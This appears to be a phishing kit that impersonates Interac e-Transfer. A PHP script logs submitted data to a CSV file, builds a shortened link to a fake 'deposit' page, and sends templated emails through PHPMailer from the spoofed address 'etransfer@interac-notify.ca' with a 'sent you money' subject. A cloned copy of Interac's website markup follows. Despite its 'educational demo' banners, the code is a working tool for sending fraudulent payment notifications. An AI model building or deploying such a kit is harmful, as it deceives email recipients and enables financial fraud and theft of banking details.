
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require("PHPMailer/src/PHPMailer.php");
require("PHPMailer/src/SMTP.php");
require("PHPMailer/src/Exception.php");


$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

$template = $_POST['template']; // The selected template from the dropdown
$message = file_get_contents('template.html');
$message = str_replace('{{shortlink}}', $short_url, $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expire}}', $_POST['expire'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('etransfer@interac-notify.ca', $_POST['sender_name']);
$mail->AddAddress($_POST['receiver_email']);
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

if (!$mail->Send()) {
    echo "THIS IS NOT THE OFFICIAL INTERAC WEBSITE. THIS IS AN EDUCATIONAL DEMO";
}

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$currentDate = new DateTime();
$line = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en-CA" class="" style="--viewport-height: 95vh; --input-range-height: 80px;"><head>  <meta name="viewport" content="width=device-width, initial-scale=1">
</head><body class="" data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0"><center>THIS IS NOT THE OFFICIAL INTERAC WEBSITE<br> THIS IS AN EDUCATIONAL DEMO
  </center><meta charset="utf-8">
  
  
  
  




	
	
	
	
	
	
	
	
	
	
	
	
	
	<script type="text/javascript" async="" defer="" src="https://stats.wpmucdn.com/analytics####"></script><script async="" src="https://www.googletagmanager.com/gtm####?id=GTM-P2MDR6C"></script><script type="text/javascript" async="" defer="" src="https://stats.wpmucdn.com/analytics####"></script><script async="" src="https://www.googletagmanager.com/gtm####?id=GTM-P2MDR6C"></script><script type="text/javascript" id="www-widgetapi-script" src="https://www.youtube.com/s/player/b7910ca8/www-widgetapi.vflset/www-widgetapi.js" async=""></script><script type="text/javascript" async="" defer="" src="https://stats.wpmucdn.com/analytics####"></script><script async="" src="https://www.googletagmanager.com/gtm####?id=GTM-P2MDR6C"></script><script type="text/javascript" id="www-widgetapi-script" src="https://www.youtube.com/s/player/b7910ca8/www-widgetapi.vflset/www-widgetapi.js" async=""></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=DC-4168148&amp;l=dataLayer&amp;cx=c"></script><script type="text/javascript" async="" defer="" src="https://stats.wpmucdn.com/analytics####"></script><script async="" src="https://www.googletagmanager.com/gtm####?id=GTM-P2MDR6C"></script><script type="text/javascript" id="www-widgetapi-script" src="https://www.youtube.com/s/player/b7910ca8/www-widgetapi.vflset/www-widgetapi.js" async=""></script><script src="https://s.yimg.com/wi/ytc####" async=""></script><script async="" src="https://snap.licdn.com/li.lms-analytics/insight.old.min####"></script><script async="" src="https://s.pinimg.com/ct/lib/main.14eb2ef4####"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-D0QYWPQ1KE&amp;l=dataLayer&amp;cx=c"></script><script src="//www.youtube.com/iframe_api"></script><script src="https:##signals/config/391172148148659?v=2.9.109&amp;r=stable" async=""></script><script async="" src="https:##en_US/fbevents####"></script><script type="text/javascript" async="" src="https://snap.licdn.com/li.lms-analytics/insight.min####"></script><script type="text/javascript" async="" src="https://unpkg.com/web-vitals/dist/web-vitals.iife####"></script><script type="text/javascript" async="" src="https://s.pinimg.com/ct/core####"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics####"></script><script src="https://js.hs-banner.com/2712303####" type="text/javascript" id="cookieBanner-2712303" data-cookieconsent="ignore" data-hs-ignore="true" data-loader="hs-scriptloader" data-hsjs-portal="2712303" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="https://js.hs-analytics.net/analytics/1687710000000/2712303####" type="text/javascript" id="hs-analytics"></script><script src="https:##en_US/sdk####?hash=a3a10ad47611ae8c8d49d4bda1a02a04" async="" crossorigin="anonymous"></script><script type="text/javascript" async="" defer="" src="https://stats.wpmucdn.com/analytics####"></script><script async="" src="https://www.googletagmanager.com/gtm####?id=GTM-P2MDR6C"></script><script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://www.interac.ca/en/business/our-solutions/","url":"https://www.interac.ca/en/business/our-solutions/","name":"Payment solutions that work for you - Business - Interac","isPartOf":{"@id":"https://www.interac.ca/en/#website"},"datePublished":"2019-08-21T15:44:36+00:00","dateModified":"2022-07-07T15:33:35+00:00","description":"Our range of payment solutions meet evolving technology and consumer needs to help businesses stay ahead. Discover our business solutions.","breadcrumb":{"@id":"https://www.interac.ca/en/business/our-solutions/#breadcrumb"},"inLanguage":"en-CA","potentialAction":[{"@type":"ReadAction","target":["https://www.interac.ca/en/business/our-solutions/"]}]},{"@type":"BreadcrumbList","@id":"https://www.interac.ca/en/business/our-solutions/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.interac.ca/en/"},{"@type":"ListItem","position":2,"name":"Our Products"}]},{"@type":"WebSite","@id":"https://www.interac.ca/en/#website","url":"https://www.interac.ca/en/","name":"Interac","description":"","publisher":{"@id":"https://www.interac.ca/en/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.interac.ca/en/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-CA"},{"@type":"Organization","@id":"https://www.interac.ca/en/#organization","name":"Interac Corp.","url":"https://www.interac.ca/en/","logo":{"@type":"ImageObject","inLanguage":"en-CA","@id":"https://www.interac.ca/en/#/schema/logo/image/","url":"https://www.interac.ca/wp-content/uploads/2022/03/Interac_Two-Colour_RGB.png","contentUrl":"https://www.interac.ca/wp-content/uploads/2022/03/Interac_Two-Colour_RGB.png","width":2210,"height":2210,"caption":"Interac Corp."},"image":{"@id":"https://www.interac.ca/en/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/interac","https://twitter.com/interac","https://www.instagram.com/interac/","https://www.linkedin.com/company/interac-corp/","https://www.youtube.com/user/InteracBrand"]}]}</script>
	<!-- / Yoast SEO Premium plugin. -->


<link rel="dns-prefetch" href="//js.hs-scripts.com">
<link rel="stylesheet" id="wp-block-library-css" href="https://www.interac.ca/wp-includes/css/dist/block-library/style.min.css?ver=6.2.2" type="text/css" media="all">
<link rel="stylesheet" id="classic-theme-styles-css" href="https://www.interac.ca/wp-includes/css/classic-themes.min.css?ver=6.2.2" type="text/css" media="all">
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="wpml-blocks-css" href="https://www.interac.ca/wp-content/plugins/sitepress-multilingual-cms/dist/css/blocks/styles.css?ver=4.6.3" type="text/css" media="all">
<link rel="stylesheet" id="rate-my-post-css" href="https://www.interac.ca/wp-content/plugins/rate-my-post/public/css/rate-my-post.css?ver=3.4.1" type="text/css" media="all">
<link rel="stylesheet" id="cookie-law-info-css" href="https://www.interac.ca/wp-content/plugins/webtoffee-gdpr-cookie-consent/public/css/cookie-law-info-public.css?ver=2.3.7" type="text/css" media="all">
<link rel="stylesheet" id="cookie-law-info-gdpr-css" href="https://www.interac.ca/wp-content/plugins/webtoffee-gdpr-cookie-consent/public/css/cookie-law-info-gdpr.css?ver=2.3.7" type="text/css" media="all">
<style id="cookie-law-info-gdpr-inline-css" type="text/css">
.cli-modal-content, .cli-tab-content { background-color: #ffffff; }.cli-privacy-content-text, .cli-modal .cli-modal-dialog, .cli-tab-container p, a.cli-privacy-readmore { color: #000000; }.cli-tab-header { background-color: #f2f2f2; }.cli-tab-header, .cli-tab-header a.cli-nav-link,span.cli-necessary-caption,.cli-switch .cli-slider:after { color: #000000; }.cli-switch .cli-slider:before { background-color: #ffffff; }.cli-switch input:checked + .cli-slider:before { background-color: #ffffff; }.cli-switch .cli-slider { background-color: #e3e1e8; }.cli-switch input:checked + .cli-slider { background-color: #28a745; }.cli-modal-close svg { fill: #000000; }.cli-tab-footer .wt-cli-privacy-accept-all-btn { background-color: #00acad; color: #ffffff}.cli-tab-footer .wt-cli-privacy-accept-btn { background-color: #00acad; color: #ffffff}.cli-tab-header a:before{ border-right: 1px solid #000000; border-bottom: 1px solid #000000; }
</style>
<link rel="stylesheet" id="al-front-style-css" href="https://www.interac.ca/wp-content/plugins/abm-locator/css/al-front.css?ver=6.2.2" type="text/css" media="all">
<link rel="stylesheet" id="sage/main.css-css" href="https://www.interac.ca/wp-content/themes/interac-corp/dist/styles/main_47882568.css" type="text/css" media="all">
<link rel="stylesheet" id="sage/chatbot-css-css" href="https://www.interac.ca/wp-content/themes/interac-corp/resources/assets/scripts/components/chatbot/main.93f7f50c.chunk.css" type="text/css" media="all">
<script type="text/javascript" src="https://www.interac.ca/wp-includes/js/jquery/jquery.min####?ver=3.6.4" id="jquery-core-js"></script>
<script type="text/javascript" src="https://www.interac.ca/wp-includes/js/jquery/jquery-migrate.min####?ver=3.4.0" id="jquery-migrate-js"></script>
<script type="text/javascript" id="wpml-cookie-js-extra">
/* <![CDATA[ */
var wpml_cookies = {"wp-wpml_current_language":{"value":"en","expires":1,"path":"\/"}};
var wpml_cookies = {"wp-wpml_current_language":{"value":"en","expires":1,"path":"\/"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.interac.ca/wp-content/plugins/sitepress-multilingual-cms/res/js/cookies/language-cookie####?ver=4.6.3" id="wpml-cookie-js"></script>
<script type="text/javascript" id="cookie-law-info-js-extra">
/* <![CDATA[ */
var Cli_Data = {"nn_cookie_ids":["","","","","","test_cookie"],"non_necessary_cookies":{"non-necessary":["DoubleClick","LinkedIn Analytics","Google Analytics","Facebook Connect","AddThis","test_cookie"]},"cookielist":{"necessary":{"id":136,"status":true,"priority":0,"title":"Essential","strict":true,"default_state":false,"ccpa_optout":false,"loadonstart":false},"non-necessary":{"id":137,"status":true,"priority":0,"title":"Non Essential","strict":false,"default_state":false,"ccpa_optout":false,"loadonstart":false}},"ajax_url":"https:\/\/www.interac.ca\/wp-admin\/admin-ajax.php","current_lang":"en","security":"b7539f622d","eu_countries":["GB"],"geoIP":"disabled","use_custom_geolocation_api":"","custom_geolocation_api":"https:\/\/geoip.cookieyes.com\/geoip\/checker\/result.php","consentVersion":"2","strictlyEnabled":["necessary","obligatoire"],"cookieDomain":"","privacy_length":"250","ccpaEnabled":"","ccpaRegionBased":"","ccpaBarEnabled":"","ccpaType":"gdpr","triggerDomRefresh":"","secure_cookies":""};
var log_object = {"ajax_url":"https:\/\/www.interac.ca\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.interac.ca/wp-content/plugins/webtoffee-gdpr-cookie-consent/public/js/cookie-law-info-public####?ver=2.3.7" id="cookie-law-info-js"></script>
<link rel="https://api.w.org/" href="https://www.interac.ca/en/wp-json/"><link rel="alternate" type="application/json" href="https://www.interac.ca/en/wp-json/wp/v2/business/177"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.interac.ca/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.interac.ca/wp-includes/wlwmanifest.xml">
<meta name="generator" content="WordPress 6.2.2">
<link rel="shortlink" href="https://www.interac.ca/en/?p=177">
<link rel="alternate" type="application/json+oembed" href="https://www.interac.ca/en/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.interac.ca%2Fen%2Fbusiness%2Four-solutions%2F">
<link rel="alternate" type="text/xml+oembed" href="https://www.interac.ca/en/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.interac.ca%2Fen%2Fbusiness%2Four-solutions%2F&amp;format=xml">
<meta name="generator" content="WPML ver:4.6.3 stt:1,4;">
			<!-- DO NOT COPY THIS SNIPPET! Start of Page Analytics Tracking for HubSpot WordPress plugin v10.1.24-->
			<script type="text/javascript" class="hsq-set-content-id" data-content-id="blog-post">
				var _hsq = _hsq || [];
				_hsq.push(["setContentType", "blog-post"]);
			</script>
			<!-- DO NOT COPY THIS SNIPPET! End of Page Analytics Tracking for HubSpot WordPress plugin -->
					<link rel="manifest" href="https://www.interac.ca/en/wp-json/wp/v2/web-app-manifest">
		<meta name="theme-color" content="#fff">
						<meta name="apple-mobile-web-app-capable" content="yes">
				<meta name="mobile-web-app-capable" content="yes">

				<link rel="apple-touch-startup-image" href="https://www.interac.ca/wp-content/uploads/2023/01/cropped-Interac_Two-Colour_RGB-favicon512x512-192x192.png">

				<meta name="apple-mobile-web-app-title" content="Interac">
		<meta name="application-name" content="Interac">
				<script>
			document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );
		</script>
				<style>
			.no-js img.lazyload { display: none; }
			figure.wp-block-image img.lazyloading { min-width: 150px; }
							.lazyload, .lazyloading { opacity: 0; }
				.lazyloaded {
					opacity: 1;
					transition: opacity 400ms;
					transition-delay: 0ms;
				}
					</style>
		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><link rel="icon" href="https://www.interac.ca/wp-content/uploads/2023/01/cropped-Interac_Two-Colour_RGB-favicon512x512-32x32.png" sizes="32x32">
<link rel="icon" href="https://www.interac.ca/wp-content/uploads/2023/01/cropped-Interac_Two-Colour_RGB-favicon512x512-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://www.interac.ca/wp-content/uploads/2023/01/cropped-Interac_Two-Colour_RGB-favicon512x512-180x180.png">
<meta name="msapplication-TileImage" content="https://www.interac.ca/wp-content/uploads/2023/01/cropped-Interac_Two-Colour_RGB-favicon512x512-270x270.png">
		<style type="text/css" id="wp-custom-css">
			body.page-welcome-back-data .story-block .inline-link,
body.page-nous-saluons-le-retour-data .story-block .inline-link{
	display: none;
}

body.page-filter-data section.button-link a.button-ochre, body.page-filtre-data section.button-link a.button-ochre{
		font-size: 18px;
    padding: 15px 35px;
}

body.home .block-homepage-hero.fr h1.block-hero_heading {
	margin-left: 0;
}

body.home .block-homepage-hero {
	background-position: center
}

h2.gsection_title {
	display: none;
}

body.template-sound-of-spending div.wt-cli-cookie-bar-container,
body.template-sound-of-spending #chatbot {display: none !important;}

body.single-content-ressources-pour-les-proprietaires-de-petites-entreprises-se-preparer-a-la-croissance-du-paiement-omnicanal-data .post-callout {
	display: none;
}

@media only screen and (max-width: 480px) {
	
	body.home .block-homepage-hero.fr div.hero-cta {
		padding-top: 0;
	}
	.single-content-transparent-billboards-data #t1t2-hero .grid-container.animated.fadeIn{
		background-position: -240px center;
	}
}

.soundofspending .nav-links li:first-child {
	display: none;
}


.single-consumers-e-commerce-data #fi-dropdown-block_620e726d92565,
.single-consumers-debit-interac-sur-les-sites-web-data #fi-dropdown-block_61b212046e82d{
	margin-top: -250px;
}

body.single-content .mobile-language-switcher {
	   display: block;
    list-style: none;
    margin: 0;
    margin-left: 1.25rem;
}

body.single-content .split-carousel{
	margin-top: 0;
	margin-bottom: 0;
}

@media print, screen and (min-width: 64em) {
	.split-carousel .slider .slide-content {
		padding: 0 25px;
	}
}


@media only screen and (max-width: 768px) {
	
	.content-toggle-row h3 {
		padding-top: 20px;
	}
	body.digital-id .block-t1t2-hero .hero-image{
		height: 420px;
	}
}

/*home page - EN */
body.home #spotify-embed .grid-x {
	flex-flow: column wrap;
}
/*home page - FR */
body.home .block-homepage-hero.fr .block-hero_container h1.block-hero_heading {
	font-size: 2.6rem;
}
body.home .block-homepage-hero.fr .block-hero_container h1.block-hero_heading span {
/* 	display: inline; */
	width: auto;
}
@media only screen and (min-width: 1400px) {
	body.home .block-homepage-hero.fr .block-hero_container h1.block-hero_heading {
	font-size: 5.9rem;
/* 	display: inline-block; */
}
}


/* ITK Hero overlay */
body.single-content .block-t1t2-hero .grid-container.animated.fadeIn .overlay{
	background-image: none;
}


/* ITK slide Carousel fix */
@media screen and (min-width: 64em) {
article.content section.split-carousel .slickSlider .slide-content {
	padding: 0;
}
}
article.content section.split-carousel .slickSlider .slide-content .slide-title {
	font-size: 24px;
	line-height: 1.4;
}

article.content section.split-carousel button.slick-prev {
	left: -5%;
}
article.content section.split-carousel button.slick-next {
	right: -2%;
}

/* ITK profile */
body.single article.content header.post-header .author-meta .author_profile_img a {
	background-image: none;
}
		</style>
		    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
      new Date().getTime(),event:'gtm####'});var f=d.getElementsByTagName(s)[0],
      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
      'https://www.googletagmanager.com/gtm####?id='+i+dl;f.parentNode.insertBefore(j,f);
      })(window,document,'script','dataLayer','GTM-P2MDR6C');</script>
      <!-- End Google Tag Manager -->
  <link rel="stylesheet" href="https://use.typekit.net/zey0ilj.css">
  <link rel="apple-touch-icon" sizes="180x180" href="https://www.interac.ca/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://www.interac.ca/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://www.interac.ca/favicon-16x16.png">
  <link rel="manifest" href="https://www.interac.ca/site.webmanifest">
  <link rel="mask-icon" href="https://www.interac.ca/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#000000">
  <meta name="theme-color" content="#ffffff">
<meta class="foundation-mq" name="foundation-mq" content=""><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><style type="text/css">@import url(https://fonts.googleapis.com/icon?family=Material+Icons);</style><style type="text/css">.next-action{line-height:initial}.next-action--new{margin-bottom:var(--bottom-offset) !important}.next-action--new[data-next-action-type="RELATED_STORIES"]:before{content:"RELATED STORIES";font-family:var(--font-family);font-variant:var(--font-variant);font-size:calc(0.8 * var(--font-size));margin-bottom:0.5em}.next-action--new .next-action--wrap{width:100%}.next-action--new .next-action--buttons-wrap{display:flex;justify-content:center;flex-wrap:wrap;margin-top:0 !important}.next-action--new .next-action--story-button{display:flex;gap:20px;background:none 